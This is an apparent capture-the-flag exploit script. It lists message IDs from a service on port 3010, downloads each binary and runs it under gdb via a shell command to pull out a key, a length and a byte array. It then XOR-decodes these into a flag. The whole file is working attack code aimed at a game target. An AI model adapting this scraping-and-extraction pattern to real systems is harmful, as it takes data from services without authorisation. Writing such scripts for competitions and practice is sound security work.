#!/usr/bin/env python3

import requests,sys,re
import subprocess as sp
from threading import Timer
ip = sys.argv[1]

list_index = requests.get("http://%s:3010/list" %(ip))

refs = re.findall('message_id=([0-9A-Z]+)"',list_index.text)

print (refs)

def getflag(fname):
    res1 = sp.Popen("sh -c 'gdb -silent -x deb.txt %s' < /dev/null " % (fname,),shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    timer = Timer(2, res1.kill)
    res_stdout,res_stderr=("","")
    try:
        timer.start()
        res_stdout,res_stderr = res1.communicate()
    finally:
        timer.cancel()
    if res1.returncode!=0:
        return ""
    res = res_stdout.decode()
    f1=re.findall(r'\$1 = (0x[0-9a-f]+)',res)
    if len(f1)==0:
        return ""
    f1=f1[0]
    f2=re.findall(r'\$2 = ([0-9]+)',res)[0]
    f3=re.findall(r'\$3 = \{(.+)\}',res,re.DOTALL)[0]
    f3 = [i for i in map(lambda x: int(x,16),re.findall(r'([x0-9a-f]+)',f3))]

    sz = int(f2,16)
    key = int(f1,16)
    res = []
    f3=f3[0:sz-6]
    for c in f3:
        res.append(chr((c ^ key) & 0xff))
    flag= "".join(res)
    return flag

for ref in refs:
    res = requests.get("http://%s:3010/get?message_id=%s" %(ip,ref),stream=True)
    if res.status_code == 200:
        with open(ref, 'wb') as f:
            for chunk in res:
                f.write(chunk)
        print(getflag(ref))
